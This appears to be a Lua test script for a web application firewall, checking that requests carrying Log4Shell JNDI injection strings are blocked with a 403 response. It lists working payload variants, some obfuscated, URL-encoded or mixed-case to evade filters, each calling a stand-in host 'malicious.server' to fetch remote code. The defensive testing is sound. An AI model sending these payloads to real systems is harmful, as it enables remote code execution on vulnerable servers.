local subname = ""
-- 发送 GET 请求
local response = nil

local test_cases = {
    -- Basic JNDI Lookup
    "${jndi:ldap://malicious.server/a}",
    -- Obfuscated JNDI Lookup
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://malicious.server/a}",
    -- URL Encoding
    "%24%7Bjndi%3Aldap%3A%2F%2Fmalicious.server%2Fa%7D",
    -- Double URL Encoding
    "%2524%257Bjndi%253Aldap%253A%252F%252Fmalicious.server%252Fa%257D",
    -- Mixed Case JNDI Lookup
    "${JnDi:ldap://malicious.server/a}",
    -- Alternative LDAP Protocols
    "${jndi:ldaps://malicious.server/a}",
    "${jndi:rmi://malicious.server/a}",
    -- Embedded JNDI Lookup
    "Hello ${jndi:ldap://malicious.server/a} World",
    -- JNDI Lookup in Headers (Represented as URL params for simplicity)
    "${jndi:ldap://malicious.server/a}", -- User-Agent
    -- JNDI Lookup in Body (Represented as URL params for simplicity)
    '{"username": "${jndi:ldap://malicious.server/a}"}' 
}



for _, jndi in ipairs(test_cases) do
    subname = "JNDI TEST - "..jndi
    response = client:get(url .."/", "link="..jndi)

    assertAll(response.body, "Attack detected", response.status, "403 Forbidden", TEST_CASE..subname)
end